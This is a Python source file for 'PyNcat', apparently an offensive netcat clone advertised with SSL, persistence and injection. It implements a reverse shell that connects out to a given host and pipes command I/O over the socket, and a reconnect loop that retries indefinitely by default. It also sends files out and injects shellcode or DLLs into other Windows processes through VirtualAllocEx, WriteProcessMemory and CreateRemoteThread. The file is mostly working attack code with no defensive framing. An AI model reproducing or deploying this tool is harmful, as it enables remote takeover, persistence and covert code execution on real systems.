#!/usr/bin/env python3
import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import ssl
import os
import time
import ctypes

# Windows API setup
if os.name == 'nt':
    from ctypes import wintypes
    kernel32 = ctypes.windll.kernel32
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    PROCESS_ALL_ACCESS = 0x1F0FFF

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        if self.args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        self.ssl_context = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Better Netcat + SSL + Persistence + Injection", 
                                       formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Connect to target (reverse shell)')
        
        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        parser.add_argument('-u', '--udp', action='store_true', help='Use UDP protocol instead of TCP')
        parser.add_argument('-e', '--execute', type=str, help='Execute a command string and redirect I/O to network')
        parser.add_argument('-f', '--file', type=str, help='File to upload/save')
        
        # SSL
        parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS')
        parser.add_argument('--cert', type=str, help='SSL certificate path')
        parser.add_argument('--key', type=str, help='SSL private key path')
        
        # Persistence
        parser.add_argument('--persistent', action='store_true', help='Persistent reverse shell')
        parser.add_argument('--max-retries', type=int, default=0, help='Max retries (0 = infinite)')
        parser.add_argument('--delay', type=int, default=5, help='Base retry delay (seconds)')
        
        # Process Injection (Windows only)
        parser.add_argument('--inject-pid', type=int, help='PID to inject into')
        parser.add_argument('--shellcode', type=str, help='Path to shellcode binary file')
        parser.add_argument('--dll', type=str, help='Path to DLL for injection')
        
        parser.add_argument('-v', '--verbose', action='store_true')
        
        return parser.parse_args()

    def setup_ssl(self):
        if self.args.udp:
            logging.warning("[!] SSL/TLS is not compatible with UDP in this version. Disabling SSL.")
            self.args.ssl = False
            return

        cert_path = self.args.cert
        key_path = self.args.key

        if not cert_path or not key_path:
            logging.info("[*] Generating self-signed certificate...")
            cert_path, key_path = self.generate_self_signed_cert()

        try:
            if self.args.listen:
                self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                self.ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            else:
                self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                self.ssl_context.check_hostname = False
                self.ssl_context.verify_mode = ssl.CERT_NONE
        except Exception as e:
            logging.error(f"SSL setup failed: {e}")
            sys.exit(1)

    def generate_self_signed_cert(self):
        try:
            from OpenSSL import crypto
        except ImportError:
            logging.error("[!] OpenSSL dependency missing. Run: pip install pyOpenSSL")
            sys.exit(1)

        cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pyncat_cert.pem")
        key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pyncat_key.pem")

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.get_subject().CN = "pyncat"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365*24*60*60)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        return cert_path, key_path

    # === PROCESS INJECTION METHODS ===
    def inject_shellcode(self, pid: int, shellcode_path: str = None):
        if os.name != 'nt':
            logging.error("[!] Shellcode injection only supported on Windows")
            return False
        try:
            if shellcode_path and Path(shellcode_path).exists():
                with open(shellcode_path, 'rb') as f:
                    shellcode = f.read()
            else:
                shellcode = bytes([0x90, 0x90, 0xCC, 0xC3])  # NOP, NOP, INT3, RET fallback
                logging.info("[*] Using basic debugging shellcode fallback.")

            logging.info(f"[*] Injecting into PID: {pid} | Size: {len(shellcode)} bytes")
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                logging.error(f"[!] Failed to open process {pid}")
                return False

            addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                logging.error("[!] Memory allocation failed")
                return False

            written = ctypes.c_size_t(0)
            kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))
            
            thread_id = ctypes.c_ulong(0)
            if not kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)):
                logging.error("[!] CreateRemoteThread failed")
                return False

            logging.info(f"[+] Shellcode injected successfully! Thread ID: {thread_id.value}")
            return True
        except Exception as e:
            logging.error(f"Injection failed: {e}")
            return False

    def inject_dll(self, pid: int, dll_path: str):
        if os.name != 'nt':
            logging.error("[!] DLL injection only supported on Windows")
            return False
        if not Path(dll_path).exists():
            logging.error(f"[!] DLL not found: {dll_path}")
            return False

        try:
            dll_path = str(Path(dll_path).absolute())
            dll_len = len(dll_path) + 1

            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                logging.error(f"[!] Cannot open PID {pid}")
                return False

            addr = kernel32.VirtualAllocEx(h_process, None, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                logging.error("[!] Memory allocation failed in target process.")
                return False

            written = ctypes.c_size_t(0)
            kernel32.WriteProcessMemory(h_process, addr, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))

            h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
            h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

            thread_id = ctypes.c_ulong(0)
            if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, addr, 0, ctypes.byref(thread_id)):
                logging.error("[!] CreateRemoteThread for LoadLibraryA failed.")
                return False

            logging.info(f"[+] DLL injected successfully into PID {pid}. Thread ID: {thread_id.value}")
            return True
        except Exception as e:
            logging.error(f"DLL Injection exception: {e}")
            return False

    # === I/O PIPE HANDLING ===
    def handle_io(self, client_socket):
        if self.args.execute:
            self.execute_command(client_socket)
        elif self.args.file:
            self.handle_file_transfer(client_socket)
        else:
            self.interactive_shell(client_socket)

    def execute_command(self, client_socket):
        try:
            # Platform aware basic execution environment
            shell = True if os.name != 'nt' else False
            proc = subprocess.Popen(
                self.args.execute,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE
            )
            
            def pipe_socket_to_proc():
                try:
                    while True:
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        proc.stdin.write(data)
                        proc.stdin.flush()
                except Exception:
                    pass

            def pipe_proc_to_socket():
                try:
                    while True:
                        data = proc.stdout.read(1024)
                        if not data:
                            break
                        client_socket.sendall(data)
                except Exception:
                    pass

            t1 = threading.Thread(target=pipe_socket_to_proc, daemon=True)
            t2 = threading.Thread(target=pipe_proc_to_socket, daemon=True)
            t1.start()
            t2.start()
            proc.wait()
        except Exception as e:
            logging.error(f"Command execution mapping failed: {e}")

    def handle_file_transfer(self, client_socket):
        try:
            if self.args.listen:
                # Write incoming stream to file
                with open(self.args.file, 'wb') as f:
                    while True:
                        data = client_socket.recv(4096)
                        if not data:
                            break
                        f.write(data)
                logging.info(f"[+] File saved to {self.args.file}")
            else:
                # Read outgoing local file onto wire
                if Path(self.args.file).exists():
                    with open(self.args.file, 'rb') as f:
                        client_socket.sendall(f.read())
                    logging.info("[+] File transmitted.")
                else:
                    logging.error(f"[!] File {self.args.file} not found.")
        except Exception as e:
            logging.error(f"File transmission error: {e}")

    def interactive_shell(self, client_socket):
        def receive_from_sock():
            try:
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
                    sys.stdout.flush()
            except Exception:
                pass

        t = threading.Thread(target=receive_from_sock, daemon=True)
        t.start()

        try:
            while True:
                user_input = sys.stdin.readline()
                if not user_input:
                    break
                client_socket.sendall(user_input.encode('utf-8'))
        except Exception as e:
            logging.debug(f"Interactive pipe closed: {e}")

    # === NETWORK RUNTIME ===
    def start(self):
        retries = 0
        while True:
            try:
                if self.args.listen:
                    self.run_listener()
                    break
                elif self.args.connect:
                    self.run_connector()
                    if not self.args.persistent:
                        break
            except KeyboardInterrupt:
                logging.info("\n[*] Exiting by user request.")
                break
            except Exception as e:
                logging.error(f"Runtime error encountered: {e}")
                if not self.args.persistent:
                    break

            if self.args.persistent:
                if self.args.max_retries and retries >= self.args.max_retries:
                    logging.info("[!] Max retries reached. Exiting persistence loop.")
                    break
                retries += 1
                logging.info(f"[*] Reconnecting in {self.args.delay} seconds (Attempt {retries})...")
                time.sleep(self.args.delay)

    def run_listener(self):
        sock_type = socket.SOCK_DGRAM if self.args.udp else socket.SOCK_STREAM
        server = socket.socket(socket.AF_INET, sock_type)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.args.port))

        if self.args.udp:
            logging.info(f"[*] UDP Server listening on port {self.args.port}...")
            # Native UDP parsing logic fallback
            while True:
                data, addr = server.recvfrom(4096)
                sys.stdout.write(data.decode('utf-8', errors='ignore'))
                sys.stdout.flush()
        else:
            server.listen(5)
            logging.info(f"[*] TCP Server listening on port {self.args.port}...")
            while True:
                client_sock, addr = server.accept()
                logging.info(f"[+] Connection accepted from {addr[0]}:{addr[1]}")
                if self.args.ssl and self.ssl_context:
                    try:
                        client_sock = self.ssl_context.wrap_socket(client_sock, server_side=True)
                    except Exception as e:
                        logging.error(f"[!] SSL Handshake failed: {e}")
                        client_sock.close()
                        continue

                handler = threading.Thread(target=self.handle_io, args=(client_sock,), daemon=True)
                handler.start()

    def run_connector(self):
        sock_type = socket.SOCK_DGRAM if self.args.udp else socket.SOCK_STREAM
        client = socket.socket(socket.AF_INET, sock_type)

        if self.args.ssl and self.ssl_context:
            client = self.ssl_context.wrap_socket(client, server_hostname=self.args.connect)

        logging.info(f"[*] Contacting target {self.args.connect}:{self.args.port}...")
        client.connect((self.args.connect, self.args.port))
        logging.info("[+] Connection established.")
        self.handle_io(client)

if __name__ == "__main__":
    netcat = PyNcat()
    netcat.start()

